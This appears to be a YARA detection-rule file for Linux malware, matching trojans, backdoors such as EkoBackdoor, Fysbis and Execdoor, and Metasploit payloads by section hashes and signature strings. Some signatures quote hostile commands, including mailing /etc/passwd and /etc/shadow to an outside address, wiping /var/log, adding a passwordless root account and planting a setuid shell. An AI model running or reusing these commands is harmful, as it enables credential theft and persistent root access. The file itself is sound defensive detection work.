import "elf"
import "hash"
import "pe"
include "rules/commons.yar"


// rule Trojan_3
// {
//   meta:
//     author = "Nong Hoang Tu"
//     email = "dmknght@parrotsec.org"
//     description = "Linux Trojan. Some AV vendors can't detect. https://www.virustotal.com/gui/file/6469fcee5ede17375b74557cdd18ef6335c517a4cccfff86288f07ff1761eaa7"
//   condition:
//     is_elf and
//     for any i in (0 .. elf.number_of_sections - 1): (
//       hash.md5(elf.sections[i].offset, elf.sections[i].size) == "bbe7d25b87e2b810db57b6d532b10d09"
//     )
// }

rule Agent_1
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    hash = "4b060ab45f7acc1b2959dd5969f97a45d6fecd06f311763afbb864eaea4161e4"
    vrt_report = "https://www.virustotal.com/gui/file/4b060ab45f7acc1b2959dd5969f97a45d6fecd06f311763afbb864eaea4161e4"
    /*
      Uncommon imports: fexecve, syscall, getpid)
      Uncommon strings: "pid,%d", "no_elf",
      Code (function main):
        uVar1 = getpid();
        printf("pid,%d", uVar1);
        uVar1 = syscall(0x13f, "no_elf", 1);
        write(uVar1, 0x400988, 0x100);
        fexecve(uVar1, &var_20h, &var_10h);
    */
  strings:
    // .rodata
    $str1 = "pid,%d"
    $str2 = "no_elf"
    // .dynstr
    $import1 = "fexecve"
    $import2 = "getpid"
    $import3 = "syscall"
  condition:
    is_elf and
      // Check import in .dynstr
      $import1 in (elf.sections[6].offset .. elf.sections[7].offset) and
      $import2 in (elf.sections[6].offset .. elf.sections[7].offset) and
      $import3 in (elf.sections[6].offset .. elf.sections[7].offset)
    and
      // Check .rodata
      $str1 in (elf.sections[16].offset .. elf.sections[17].offset) and
      $str2 in (elf.sections[16].offset .. elf.sections[17].offset)
}

rule Agent_2
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    vrt_report = "https://www.virustotal.com/gui/file/edbee3b92100cc9a6a8a3c1a5fc00212627560c5e36d29569d497613ea3e3c16"
  condition:
    is_elf and hash.md5(elf.sections[16].offset, elf.sections[16].size) == "f3a96941a385fc9062269babdb5cbc02"
}


rule Python_IRCBot
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Python IRCBot, Unknown Trojan malware. Likely compiled from Python scripts"
    /*
      Hash of .shstrtab 98c978a3d9f51f870ec65edc9a224bf8 matches as well but i don't know if all files compiled from python is detected
      as wrong behavior
    */
  condition:
    is_elf and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "196b7c3bdcb1a697395053b23b25abce"
    )
}

rule GoLang_EzuriLoader
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Trojan written in Golang. https://www.virustotal.com/gui/file/751014e0154d219dea8c2e999714c32fd98f817782588cd7af355d2488eb1c80"
  condition:
    is_elf and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "dfd54f22d3a3bb072d34c424aa554500"
    )
}

rule custom_ssh_backdoor_server {
	meta:
		description = "Custome SSH backdoor based on python and paramiko - file server.py"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth"
		reference = "https://goo.gl/S46L3o"
		date = "2015-05-14"
		hash = "0953b6c2181249b94282ca5736471f85d80d41c9"
	strings:
		$s0 = "command= raw_input(\"Enter command: \").strip('n')" fullword ascii
		$s1 = "print '[-] (Failed to load moduli -- gex will be unsupported.)'" fullword ascii
		$s2 = "print '[-] Listen/bind/accept failed: ' + str(e)" fullword ascii
		$s3 = "chan.send(command)" fullword ascii
		$s4 = "print '[-] SSH negotiation failed.'" fullword ascii
		$s5 = "except paramiko.SSHException, x:" fullword ascii
	condition:
		filesize < 10KB and 5 of them
}


rule Metasploit_Staged {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Scan Metasploit's Linux staged payload by checking section hash"
  condition:
    is_elf and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "fbeb0b6fd7a7f78a880f68c413893f36"
    )
}

rule Execdoor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Execdoor"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/6138054a7de11c23b5c26755d7548c4096fa547cbb964ac78ef0fbe59d16c2da"
    target = "File, memory"
  strings:
    $s1 = "rm -rf /var/log/*"
    $s2 = "/bin/sh"
    $s3 = "mail -s passwdforyababe gayz0r@boi.org.ie < /etc/passwd"
    $s4 = "mail -s shadowforyababe gayz0r@boi.org.ie < /etc/shadow"
    $s5 = "Brand new TCP root shell!"
  condition:
    $s3 or $s4 or ($s1 and $s2 and $s5)
}

rule EkoBackdoor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux EkoBackdoor"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/74d29efbdf7df9bb7e51fad039e0e40455795056ec643610b38853c602a4357c"
    target = "File, memory"
  strings:
    $s1 = "Backdoor instalado! - Have a nice hack ;)"
    $s2 = "< Coded by ca0s / Ezkracho Team >"
    $s3 = ">> EkoBackdoor v1.1 by ca0s <<"
    $s4 = "stream tcp nowait root /bin/sh sh -i"
    $s5 = "Uso: ./ekobdoor [opcion] [argumento]"
    $s6 = "ekorulez"
    $s7 = ":/:/bin/sh"
    $s8 = "cp /bin/sh /tmp/sh"
    $s9 = "chmod 4711 /tmp/sh"
  condition:
    3 of them
}

rule Explodor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Explodor"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/fb5eba7a927ce0513e11cde7a496009453f2d57b72c73fcbe04e9a527a3eabac"
    target = "File, memory"
  strings:
    // $1 = "/etc/suid-debug"
    // $2 = "/proc/self/exe"
    $3 = "Unable to spawn shell"
    $4 = "keld@dkuug.dk"
    $5 = "PATH=/usr/bin:/bin:/usr/sbin:/sbin"
  condition:
    all of them
}

rule Homeunix {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Homeunix"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/ced749fecb0f9dde9355ee29007ea8a20de277d39ebcb5dda61cd290cd5dbc02"
    target = "File, memory"
  strings:
    $s1 = "unixforce::0:0:unixforce:/root:/bin/bash"
    $s2 = "/etc/passwd"
  condition:
    all of them
}

rule Fysbis {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Fysbis"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/ab6f39f913a925cf4e9fa7717db0e3eb38b5ae61e057a2e76043b539f3c0dc91"
    target = "File, memory"
    /*
    From result of string analysis, there are generated files at /usr/lib/systemd/system/, and startup file at find ~/.config/ -name autostart 
    */
  strings:
    $1 = "ls /etc | egrep -e\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\""
    $2 = "mkdir /usr/lib/sys-defender"
    $3 = "pgrep -l \"gnome|kde|mate|cinnamon|lxde|xfce|jwm\""
    $4 = "rm -f /usr/lib/systemd/system/"
  condition:
    all of them
}

rule Gbkdoor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Gbkdoor"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/a1439937c8a383f010a071130aaae4443de6b7f4f7e71789c9964ea3a9d7f4a8"
    target = "File, memory"
  strings:
    $1 = "mmeneghin@inwind.it"
    $2 = "as if you are root, but the file to trojanize must be suidroot!"
    $3 = "now, you can easily use the backdoor installed so:"
  condition:
    $1 or ($2 and $3)
}

rule Gummo {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux Gummo"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/67b9ddd4a21a78ff1a4adbf4b2fb70d279c79494d34e6e2e12673eed134f0d5f"
    target = "File, memory"
  strings:
    $ = "echo rewt::0:0::/:/bin/sh>>/etc/passwd;"
  condition:
    all of them
}

rule KBD {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Linux KBD"
    date = "12/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/3aba59e8bbaecf065d05b7a74655668484bb16fdec589b8e7d169e4adf65d840"
    target = "File, memory"
  strings:
    $1 = "Your Kung-Fu is good."
    $2 = "orig_stat"
    $3 = "bd_getuid"
    $4 = "orig_getuid"
  condition:
    all of them
}

rule Sckit {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "ELF:Sckit-A, Unix.Trojan.Suki-1, Backdoor:Linux/Rooter"
    date = "13/11/2021"
    refrence = "https://otx.alienvault.com/indicator/file/db4c0fe28e8fdce6f7b7e2e12738ff84f084667e07b408dc04dc92bd074bc0e2"
    target = "File, memory"
  strings:
    $1 = "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:./bin:/etc/.MG:/etc/.MG/bin"
    $2 = "HOME=/etc/.MG"
    $3 = "HISTFILE=/dev/null"
  condition:
    2 of them
}

rule Earthworm {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "13/11/2021"
    target = "File, memory"
  strings:
    $1 = "Earthworm is a network agent tool."
    $2 = "rootkiter : The creator"
    $3 = "darksn0w  : Proviede some advice"
    $4 = "zhuanjia  : Modify the Readme file"
    $5 = "syc4mor3  : Named for this tool"
    $6 = "http://rootkiter.com/EarthWrom/"
  condition:
    3 of them
}

rule BashDoor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "13/11/2021"
    target = "File, memory"
  strings:
    $1 = "Compiling SeCshell"
    $2 = "-=[1]=- Update and backdoor Bash."
    $3 = "-=[2]=- Compile and install SeCshell."
    $4 = "nU.ajj1cF2Qk6"
  condition:
    any of them
}

rule MushDoor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "13/11/2021"
    target = "File, memory"
  strings:
    $1 = "mushd00r"
    $2 = "username to hide  & processes"
  condition:
    all of them
}

rule ICMP_Backdoor {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $1 = "icmp-backdoor"
    $2 = "you need to be root!"
  condition:
    all of them
}

rule Lyceum {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $ = "d:D:s:S:l:p:P:u:x:i:b:I"
    $ = "icmp moonbouce backdoor"
    $ = "bi-spoofed icmp backdoor"
    $ = "spoof all packets"
  condition:
    any of them
}

rule Silencer {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $1 = /backdoor[d]_BEGIN/
    $2 = "ready for injection.."
    $3 = "0x4553-Silencer"
    $4 = "by BrainStorm and Ares"
  condition:
    any of them
}

rule Sneaky {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $1 = "i:l:t:s:S:d:D:"
    $2 = "[Sneaky@%s]#"
    $3 = "Phish@mindless.com"
  condition:
    any of them
}

rule Galore {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $1 = "Backdoor Galore By NTFX"
  condition:
    any of them
}

rule BlueDragon_sfe {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $1 = "tHE rECIdjVO"
    $2 = "<recidjvo@pkcrew.org>"
  condition:
    any of them
}

rule rrs {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "17/11/2021"
  strings:
    $ = "hlp:b:r:R:t:Dqk:x:sS:P:c:v:C:e:m0LV"
  condition:
    any of them
}